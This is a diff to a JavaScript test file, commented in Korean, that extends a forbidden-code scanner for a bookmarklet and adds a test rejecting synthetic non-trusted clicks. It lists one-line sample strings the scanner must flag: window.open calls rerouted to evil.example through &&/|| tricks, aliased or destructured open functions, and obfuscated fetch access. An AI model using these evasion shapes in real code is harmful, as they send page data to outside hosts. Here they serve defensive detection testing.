@@ -106,12 +106,21 @@ test("금지 코드 검사기가 실제로 잡는다(빈 검사 방지)", () => 
     "f.setAttribute('srcdoc', h)", "f.setAttribute('action', u)", "a.href = u", "link.click()", "a.dispatchEvent(e)",
     "document.createElement('a')", "window['fe' + 'tch']('/x')", "x[y + 'tch']('/x')", "self[`fe${t}`]('/x')", "globalThis.fetch",
     "setTimeout('go()')", "atob('Zm')",
-    // 2.1.0: 허용 모양 밖 창 열기·두 곳·상수 다시 대입
+    // 2.1.0: 허용 모양 밖 창 열기·두 곳·별칭·상수 다시 대입(검토 반영 2026-11-01: && 로 첫 인자 바꾸기·window.open 별칭)
     "window.open('https://evil.example/' + p)", "window.open(p + OPTION_FILL_TARGET)", "window.open(OPTION_FILL_TARGET)",
     "open(OPTION_FILL_TARGET + p)", "self.open(OPTION_FILL_TARGET + p)",
-    "window.open(OPTION_FILL_TARGET + a); window.open(OPTION_FILL_TARGET + b)",
-    "window.open(OPTION_FILL_TARGET + a); open('x')",
-    "const OPTION_FILL_TARGET = 'a'; OPTION_FILL_TARGET = 'b'; window.open(OPTION_FILL_TARGET + p)",
+    "window.open(OPTION_FILL_TARGET + p, \"_blank\", \"noopener,noreferrer\")",
+    `window.open(OPTION_FILL_TARGET + "" && "https://evil.example", "_blank", "noopener,noreferrer")`,
+    `window.open(OPTION_FILL_TARGET + "#mi-optfill=" + payload || "x", "_blank", "noopener,noreferrer")`,
+    `window.open(OPTION_FILL_TARGET + "#mi-optfill=" + payload, "_self", "noopener,noreferrer")`,
+    `window.open(OPTION_FILL_TARGET + "#mi-optfill=" + payload, "_blank", "")`,
+    `${ALLOWED_OPEN_TEXT}; ${ALLOWED_OPEN_TEXT}`,
+    `${ALLOWED_OPEN_TEXT}; const send = window.open; send("https://evil.example/?x=1")`,
+    `${ALLOWED_OPEN_TEXT}; const { open: o } = self; o("https://evil.example")`,
+    `${ALLOWED_OPEN_TEXT}; const o = open; o("https://evil.example")`,
+    `${ALLOWED_OPEN_TEXT}; open('x')`,
+    `const OPTION_FILL_TARGET = 'a'; OPTION_FILL_TARGET = 'b'; ${ALLOWED_OPEN_TEXT}`,
+    `const OPTION_FILL_TARGET = 'a'; function f(OPTION_FILL_TARGET) { ${ALLOWED_OPEN_TEXT}; }`,
   ]) {
     assert.ok(findForbiddenCode(sample).length > 0, sample);
   }
@@ -123,6 +132,7 @@ test("금지 코드 검사기가 실제로 잡는다(빈 검사 방지)", () => 
   for (const sample of [
     'panel.setAttribute("role", "dialog")', 'attachShadow({ mode: "open" })',
     'button.addEventListener("click", copy)', "names[entry.index]", "BASE64_URL_ALPHABET.charAt(chunk & 63)",
+    'const features = "noopener,noreferrer"', "const opener = 1; reopen = 2;",
   ]) {
     assert.deepEqual(findForbiddenCode(sample), [], sample);
   }
@@ -239,10 +249,11 @@ class FakeNode {
     (this.listeners[type] ||= []).push(listener);
   }
 
-  click() {
+  // 사람이 누른 것처럼(isTrusted) 부른다. trusted:false 는 페이지 스크립트의 합성 click 흉내.
+  click({ trusted = true } = {}) {
     // 링크를 누르면 실제 브라우저는 주소로 이동한다(요청).
     if (this.tagName === "A" || this.tagName === "AREA") this.navigate("링크 누르기");
-    for (const listener of this.listeners.click || []) listener({ preventDefault() {} });
+    for (const listener of this.listeners.click || []) listener({ isTrusted: trusted, preventDefault() {} });
   }
 
   attachShadow(options) {
@@ -724,6 +735,19 @@ test("화면: 다시 누르면 이전 패널을 지우고 하나만 남는다, '
   button(notProduct, "닫기").click();
   assert.equal(notProduct.pageBody.children.length, 0);
   assert.deepEqual(notProduct.network, []);
+});
+
+test("주 버튼: 페이지 스크립트의 합성 누르기(isTrusted 아님)로는 열지 않는다", () => {
+  for (const [state, label] of [[groupObjectState(), SAVE_LABEL], [groupOfSize(53), MANUAL_LABEL]]) {
+    const recorder = openRecorder();
+    const run = runBookmarklet({ href: ISHELL_URL, state, globals: { open: recorder.open } });
+    button(run, label).click({ trusted: false });
+    assert.equal(recorder.calls.length, 0, label);
+    assert.equal(run.pageBody.children.filter((node) => node.id === "mi-option-check-host").length, 1, "결과창도 그대로");
+    button(run, label).click();
+    assert.equal(recorder.calls.length, 1, `${label}: 사람이 누르면 연다`);
+    assertQuiet(run);
+  }
 });
 
 test("주 버튼: 창 열기가 막혀(던져) 실패하면 결과창을 남겨 다시 누를 수 있다", () => {
